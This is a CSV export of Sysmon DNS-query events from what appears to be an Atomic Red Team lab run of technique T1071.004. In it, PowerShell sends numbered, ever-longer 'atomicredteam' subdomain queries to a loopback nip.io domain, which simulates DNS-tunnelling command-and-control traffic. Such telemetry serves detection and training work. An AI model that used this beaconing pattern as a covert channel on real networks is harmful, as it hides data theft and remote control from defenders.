"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166499,"Query: 169.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.670","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166500,"Query: 170.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.714","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166501,"Query: 171.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.755","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166502,"Query: 172.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.799","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.397 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166503,"Query: 173.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.843","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.397 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166504,"Query: 174.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.888","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.397 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166505,"Query: 175.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.930","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.408 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166506,"Query: 176.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.102","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.408 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166507,"Query: 177.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.147","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.408 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166508,"Query: 178.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.471","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.408 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166509,"Query: 179.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.514","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166510,"Query: 180.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.560","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166511,"Query: 181.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.602","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166512,"Query: 182.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.644","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166513,"Query: 183.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.689","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166514,"Query: 184.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.734","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166515,"Query: 185.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.774","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166516,"Query: 186.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.816","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166517,"Query: 187.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.858","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166518,"Query: 188.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.902","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166519,"Query: 189.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.946","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166520,"Query: 190.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.987","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166521,"Query: 191.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.027","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166522,"Query: 192.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.072","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.411 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166523,"Query: 193.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.254","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.411 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166524,"Query: 194.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.300","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.411 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166525,"Query: 195.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.348","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166526,"Query: 196.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.393","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166527,"Query: 197.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.437","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166528,"Query: 198.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.481","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166529,"Query: 199.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166530,"Query: 200.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.570","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166531,"Query: 201.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.613","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166532,"Query: 202.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.658","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166533,"Query: 203.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.976","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166534,"Query: 204.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.295","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166535,"Query: 205.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.363","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.420 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166536,"Query: 206.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.408","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.420 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166537,"Query: 207.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.453","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
